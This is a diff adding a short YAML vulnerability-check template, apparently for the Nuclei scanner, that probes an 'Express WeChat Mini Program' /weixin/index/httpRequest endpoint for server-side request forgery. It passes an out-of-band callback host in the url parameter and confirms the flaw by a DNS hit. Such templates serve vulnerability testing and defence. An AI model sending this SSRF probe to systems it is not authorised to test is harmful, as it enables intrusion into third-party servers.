@@ -1,0 +1,22 @@
+id: poc-yaml-express-wechat-mps-httprequest-ssrf
+info:
+  name: Express WeChat Mini Program SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ssrf
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        GET /weixin/index/httpRequest?url=http://{{reverse}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
